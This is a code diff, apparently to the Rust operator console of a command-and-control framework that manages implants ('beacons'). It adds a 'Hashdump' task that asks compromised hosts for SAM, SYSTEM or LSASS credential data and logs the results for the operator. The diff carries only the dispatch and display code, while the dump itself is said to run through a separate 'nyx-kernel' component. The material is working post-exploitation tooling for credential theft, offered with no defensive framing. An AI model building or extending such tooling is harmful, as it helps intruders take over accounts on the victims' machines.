@@ -340,6 +340,11 @@ enum TaskKind {
     },
     /// 截屏：结果以 FileChunk 分块返回，保存到 downloads/screenshot-<taskid>.png
     Screenshot,
+    /// Hashdump. method=0/1 (SAM/SYSTEM) return `Output` text (small); method=2
+    /// (LSASS) returns `Output` containing the actionable PID+instruction
+    /// signal from the implant (the real dump happens via `nyx-kernel` out of
+    /// band). Routed as Shell-like text, NOT chunked.
+    Hashdump { method: u8 },
     /// A ping; an `ok` result confirms the beacon is alive.
     Ping,
 }
@@ -1080,7 +1085,7 @@ async fn worker_loop(
                             pending.push(PendingTask {
                                 session,
                                 task_id: tid,
-                                kind: TaskKind::Shell(ParseAs::None),
+                                kind: TaskKind::Hashdump { method },
                                 backoff: TASK_BACKOFF_START,
                                 last_poll: Instant::now(),
                                 started_at: Instant::now(),
@@ -1541,6 +1546,25 @@ fn route_result(
         }
         TaskKind::Download { .. } | TaskKind::Screenshot => {
             // handled by finish_chunked (分块重组 + 落盘)
+        }
+        TaskKind::Hashdump { method } => {
+            // Hashdump result is text Output: SAM/SYSTEM hive stream notes
+            // (method 0/1) or the LSASS PID + operator instruction (method 2).
+            // Display it line-by-line, prefixed with the method for clarity.
+            let label = match method {
+                0 => "hashdump sam",
+                1 => "hashdump system",
+                2 => "hashdump lsass",
+                _ => "hashdump",
+            };
+            for line in out.lines() {
+                log_push_session(
+                    log_buf,
+                    &format!("[{}] {}: {}", short(&t.session), label, line),
+                    Level::Info,
+                    Some(t.session.clone()),
+                );
+            }
         }
         TaskKind::Ping => {
             // An `ok` result surfaces here as the empty string; anything else is
